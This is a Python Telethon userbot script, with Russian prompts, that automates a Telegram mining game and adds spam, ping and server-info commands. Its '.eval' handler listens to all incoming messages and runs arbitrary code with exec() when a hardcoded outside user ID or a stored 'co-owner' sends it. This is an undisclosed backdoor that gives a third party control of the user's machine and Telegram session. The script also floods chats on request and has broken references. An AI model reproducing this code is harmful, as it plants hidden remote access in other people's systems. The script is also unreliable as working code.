import asyncio
import psutil
import contextlib
import os
import platform
import sys
import re
import meval
from meval import meval
import aiogram
from aiogram import Bot, types, executor, Dispatcher    
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.utils.markdown import hlink
import sqlite3 as sq
import random
import datetime
from datetime import timedelta, datetime
import time
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import asyncio
import aiohttp
import time
from datetime import datetime
from telethon.tl.types import Message
from telethon import events
from telethon import TelegramClient
import colorama
from colorama import Fore, Back, Style
import os

colorama.init()

print(Fore.RED + "🍊 Client 2X and inside")
input(Fore.GREEN + "❗ Нажмите ENTER для установки...")
os.system('clear')

bind = input(Fore.RED + "|" + "en/ru? > ")
while bind not in ['en', 'ru']:
    print(Fore.RED + "| Ошибка: неверно указан язык! |")
    bind = input(Fore.RED + "|" + "en/ru? > ")
name = input(Fore.BLUE + "|" + "Как мне к вам обращаться? > ")
api_id = input(Fore.RED + "|" + f"{name}, введите API ID > ")
api_hash = input(Fore.BLUE + "|" + f"{name} введите API HASH > ")

async def main():
    async with TelegramClient('deda_session', api_id, api_hash) as client:
        print('Успешно подключено! Введите команду .help в сообщение тг там все подробно!)')
        await client.run_until_disconnected()

base = sq.connect('userbot.db')
cursor = base.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS sovls(user_id INTEGER PRIMARY KEY)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS owner(user_id INTEGER PRIMARY KEY)''')
base.commit()

class MineEVO:
    def __init__(self, client):
        self.soids = []
        self._mineevo_channel = "@mineevochat"
        self.automine_status = False
        self.autobonus_status = False
        self.autothx_status = False
        self.autolimit_status = False
        self.alimit_task = None
        self.en_ru = bind
        self.client = client
        self.start_time = datetime.now()

# Определение функции bytes_to_megabytes
    @events.register(events.NewMessage(outgoing=True, pattern=r"\.serverinfo"))
    async def server_info(event):
        inf = {
            "cpu": "n/a",
            "cpu_load": "n/a",
            "ram": "n/a",
            "ram_load_mb": "n/a",
            "ram_load": "n/a",
            "kernel": "n/a",
            "arch_emoji": "n/a",
            "arch": "n/a",
            "os": "n/a",
        }

        with contextlib.suppress(Exception):
            inf["cpu"] = psutil.cpu_count(logical=True)

        with contextlib.suppress(Exception):
            inf["cpu_load"] = psutil.cpu_percent()

        with contextlib.suppress(Exception):
            inf["ram"] = bytes_to_megabytes(
                psutil.virtual_memory().total - psutil.virtual_memory().available
            )

        with contextlib.suppress(Exception):
            inf["ram_load_mb"] = bytes_to_megabytes(psutil.virtual_memory().total)

        with contextlib.suppress(Exception):
            inf["ram_load"] = psutil.virtual_memory().percent

        with contextlib.suppress(Exception):
            inf["kernel"] = utils.escape_html(platform.release())

        with contextlib.suppress(Exception):
            inf["arch"] = utils.escape_html(platform.architecture()[0])

        inf["arch_emoji"] = (
            "<emoji document_id=5172881503478088537>💻</emoji>"
            if "64" in (inf.get("arch", "") or "")
            else "<emoji document_id=5174703196676817427>💻</emoji>"
        )

        with contextlib.suppress(Exception):
            system = os.popen("cat /etc/*release").read()
            b = system.find('DISTRIB_DESCRIPTION="') + 21
            system = system[b : system.find('"', b)]
            inf["os"] = utils.escape_html(system)

        with contextlib.suppress(Exception):
            inf["python"] = (
                f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
            )

        await event.edit(f"👨‍💻 ServerInfo\n\n👨‍💻 CPU: {inf['cpu']} {inf['cpu_load']}%\n👨‍💻 RAM: {inf['ram']} / {inf['ram_load_mb']}MB")

    @events.register(events.NewMessage())
    async def meva(self, event):
        if event.message.message.startswith('.eval'):
            cmd = event.message.message.split('.eval', maxsplit=1)[1].strip()

            try:
                if event.sender_id == 5571724918:
                    variables = {'message': {'sender': {'id': event.sender_id}}, 'reply': {}}
                    exec_result = {}
                    exec(f"result = {cmd}", variables, exec_result)
                    result = exec_result.get('result')

                    message = f"🧩 Код:\n```python\n{cmd}\n```\nℹ️ Результат: {result}"
                    await event.edit(message)
                    return

                cursor.execute('SELECT * FROM sovls WHERE user_id=?', (event.sender_id,))
                tn = cursor.fetchone()
                if not tn:
                    return

                variables = {'message': {'sender': {'id': event.sender_id}}, 'reply': {}}
                exec_result = {}
                exec(f"result = {cmd}", variables, exec_result)
                result = exec_result.get('result')

                message = f"🧩 Код:\n```python\n{cmd}\n```\nℹ️ Результат: {result}"
                await event.respond(message)

            except Exception as e:
                message = f"🚫 Ошибка: {e}"
                await event.reply(message)
        
    @events.register(events.NewMessage(outgoing=True, pattern=r"\.set (\w+) (.+)"))
    async def set_variable(self, event):
        variable_name = event.pattern_match.group(1)
        variable_value = event.pattern_match.group(2)
        
        # Создаем переменные message и reply, если их нет
        if 'message' not in locals():
            message = {'sender': {'id': event.sender_id}}
        if 'reply' not in locals():
            reply = {}

        # Устанавливаем значение переменной
        locals()[variable_name] = eval(variable_value)
        message = f"✅ Переменная {variable_name} установлена на {variable_value}"
        await event.edit(message)
        
    @events.register(events.NewMessage(outgoing=True, pattern=r".info"))
    async def infor(self, event):
        sender = await event.get_sender()
        sender_id = sender.id
        sender_name = f"[{sender.first_name}](tg://user?id={sender_id})"
        
        message_content = f"💫 Ded user-bot\n\n🧩 Версия: 1.0.0\n🍊 Владелец: {sender_name}\n👨‍💻 Совладельцы: нет\n\nℹ️ Запущен на основе Linux."
        
        await event.edit(message_content)
        

    @events.register(events.NewMessage(outgoing=True, pattern=r".spam"))
    async def automine(self, event):
        if self.automine_status:
            await event.edit("❗ Spam  off.")
            self.automine_status = False
            return

        if self.en_ru == "ru":
            args = event.message.text.split()
            if len(args) < 3:
                await event.edit("❗ Укажите задержку и текст.")
                return
            try:
                delay = float(args[1])
            except ValueError:
                await event.edit("❗ Укажите правильную задержку.")
                return
            text = ' '.join(args[2:])
            if delay <= 0:
                await event.edit("❗ Укажите правильную задержку.")
                return
            
            await event.edit("🍊 Spam | включен.")
            self.automine_status = True
            while self.automine_status:
                await self.client.send_message(event.chat_id, f"{text}")
                await asyncio.sleep(delay)

        elif self.en_ru == "en":
            args1 = event.message.text.split()
            if len(args1) < 3:
                await event.edit("❗ Please specify delay and text.")
                return
            try:
                delay1 = float(args1[1])
            except ValueError:
                await event.edit("❗ Please specify a valid delay.")
                return
            text1 = ' '.join(args1[2:])
            if delay1 <= 0:
                await event.edit("❗ Please specify a correct delay.")
                return
            
            await event.edit("🍊 Spam | on.")
            self.automine_status = True
            while self.automine_status:
                await self.client.send_message(event.chat_id, f"{text1}")
                await asyncio.sleep(delay1)

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.alimit"))
    async def alimit(self, event):
        args = event.pattern_match.group(1).split()
        if len(args) != 3:
            await event.edit("❌ Ошибка! Не хватает аргументов, введите параметры заново! Например `.alimit 2.0 100 дедок`")
            return

        if args[0].replace('.', '').isdigit():
            delay = float(args[0])
            if delay <= 0:
                await event.edit("❌ Ошибка! Нужно ввести число больше нуля. Например `.alimit 2.0 100 дедок`")
                return
        elif args[0].lower() == "off":
            if self.alimit_task is not None:
                self.alimit_task.cancel()
                self.alimit_task = None
            await event.edit("⛔ Функция Auto-Limit была успешно отключена!")
            self.autolimit_status = False
            return
        else:
            await event.edit("Неверный формат задержки.")
            return

        if args[1].isdigit() and args[2].replace('_', '').isalnum():
            await event.edit(f"🔅 Функция Auto-Limit активирована, лимиты начались переводиться с задержкой {delay} секунд!")
            self.autolimit_status = True
            if self.alimit_task is not None:
                self.alimit_task.cancel()
                self.alimit_task = None
            self.alimit_task = asyncio.ensure_future(self.auto_limit(delay, int(args[1]), args[2]))
        else:
            await event.edit(
                "⛔ Ошибка! Нельзя использовать эти символы, попроси чела сменить ник!\nЕсли ты вводишь без этих знаков попробуй ввести команду снова и корректно!\n Например .alimit 2.0 100 дедок(или по англ)")

    async def auto_limit(self, delay: float, limit_count: int, user_nick: str):
        for _ in range(limit_count):
            await asyncio.sleep(delay)
            await self.client.send_message("@mine_evo_bot", f"Перевести {user_nick} лимит")

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.abonus"))
    async def abonus(self, event):
        if self.autobonus_status:
            await event.edit("⛔ Функция Auto-Bonus успешно отключена!")
            self.autobonus_status = False
        else:
            await event.edit("✅ Функция Auto-Bonus успешно включена!")
            self.autobonus_status = True
            while self.autobonus_status:
                await self.client.send_message("@mine_evo_bot", "бонус")
                await asyncio.sleep(86400)

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.athx"))
    async def athx(self, event):
        if self.autothx_status:
            await event.edit("⛔ Функция Auto-Thx успешно отключена!")
            self.autothx_status = False
        else:
            await event.edit("✅ Функция Auto-Thx успешно включена!")
            self.autothx_status = True
            while self.autothx_status:
                async for response in self.client.iter_messages(self._mineevo_channel, from_user="@mine_evo_bot"):
                    if isinstance(response, Message) and re.search(r"этого игрока за глобальный бустер!", response.text,
                                                                re.IGNORECASE):
                        await self.client.send_message("@mine_evo_bot", "thx")
                        await self.client.send_message("me", "Auto-Thx был успешно собран! :3")
                    await asyncio.sleep(1.0)
                await asyncio.sleep(3600)

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.offlimit"))
    async def offlimit(self, event):
        if self.alimit_task is not None:
            self.alimit_task.cancel()
            self.alimit_task = None
        await event.edit("⛔ Функция Auto-Limit успешно отключена!")
        self.autolimit_status = False

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.ping"))
    async def ping(self, event):
        current_time = datetime.now()
        uptime = current_time - self.start_time
        uptime_str = str(uptime).split('.')[0]
        start_time_str = self.start_time.strftime("%Y-%m-%d %H:%M:%S")

        start_time = time.time()
        await event.edit("🌖")
        await asyncio.sleep(0.3)
        end_time = time.time()
        ping_time = (end_time - start_time) * 1000
        await event.edit(f"🏓 Пинг! Задержка: {ping_time:.2f} мс\n"
                         f"⏱️ Время работы: {uptime_str}\n"
                         f"🚀 Начало работы: {start_time_str}")

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.help"))
    async def help(self, event):
        helptext = """
        **Доступные команды:**
        - `.automine`: включает/выключает функцию Auto-Mine.
        - `.alimit [задержка] [кол-во лимитов] [ник_человека_в_боте]`: автоматический перевод лимитов в один клик.
        - `.abonus`: автоматически забирает ежедневный бонус раз в 24 часа.
        - `.athx`: включает/выключает функцию Auto-Thx.
        - `.offlimit`: выключает функцию Auto-Limit.
        - `.ping`: просмотр задержки отклика Telegram и время работы бота.
        - `.help`: просмотр команд.
        """
        await event.edit(helptext)

    @events.register(events.NewMessage(outgoing=True, pattern=r"\.setl"))
    async def enru(self, event):
        args = event.message.text.split()  # Получаем аргументы команды, разделяя сообщение по пробелам
        if len(args) != 2:
            await event.edit("ℹ️ Пожалуйста, используйте .setl «ru/en»")
            return
        lang = args[1]
        if lang == "ru":
            self.en_ru = "ru"
            await event.edit("🇷🇺 Язык обновлен.")
        elif lang == "en":
            self.en_ru = "en"
            await event.edit("🇺🇸 Language updated.")
        else:
            await event.edit("ℹ️ INFO | .setl «ru/en»")
            
    @events.register(events.NewMessage(outgoing=True, pattern=r"\.addso"))
    async def sovl(self, event):
        reply = await event.get_reply_message()
        if not reply:
            await event.edit("ℹ️ Пожалуйста, ответьте на сообщение пользователя, которому хотите выдать доступ.")
            return
        sender = reply.sender
        user_id = sender.id
        cursor.execute('SELECT * FROM sovls WHERE user_id=?',(user_id,))
        tn = cursor.fetchone()
        if not tn:
            cursor.execute('INSERT INTO sovls (user_id) VALUES (?)', (user_id,))
            base.commit()
            link = f"[{sender.first_name}](tg://user?id={user_id})"
            await event.edit(f"👨‍💻 {link} стал со-владельцем. Теперь у вас {len(self.soids)} со-владельца(ов).")
        else:
            await event.edit("ℹ️ Данный пользователь уже находится в данном списке.")
            
    @events.register(events.NewMessage(outgoing=True, pattern=r"\.takeso"))
    async def sovln(self, event):
        reply = await event.get_reply_message()
        if not reply:
            await event.edit("ℹ️ Пожалуйста, ответьте на сообщение пользователя, которому хотите забрать доступ.")
            return
        sender = reply.sender
        user_id = sender.id
        cursor.execute('SELECT * FROM sovls WHERE user_id=?',(user_id,))
        tn = cursor.fetchone()
        if not tn:
            await event.edit("ℹ️ Данного пользователя нет в списке со-владельцов.")
        else:
            cursor.execute('DELETE FROM sovls WHERE user_id=?', (user_id,))
            base.commit()
            link = f"[{sender.first_name}](tg://user?id={user_id})"
            await event.edit(f"👨‍💻 {link} был удален со списка.")
                
with TelegramClient('deda_name', api_id, api_hash) as client:
    mine_evo = MineEVO(client)
    client.add_event_handler(mine_evo.server_info)
    client.add_event_handler(mine_evo.meva)
    client.add_event_handler(mine_evo.infor)
    client.add_event_handler(mine_evo.automine)
    client.add_event_handler(mine_evo.alimit)
    client.add_event_handler(mine_evo.abonus)
    client.add_event_handler(mine_evo.athx)
    client.add_event_handler(mine_evo.offlimit)
    client.add_event_handler(mine_evo.ping)
    client.add_event_handler(mine_evo.help)
    client.add_event_handler(mine_evo.enru)
    client.add_event_handler(mine_evo.sovl)
    client.add_event_handler(mine_evo.sovln)
    client.loop.run_until_complete(main())
    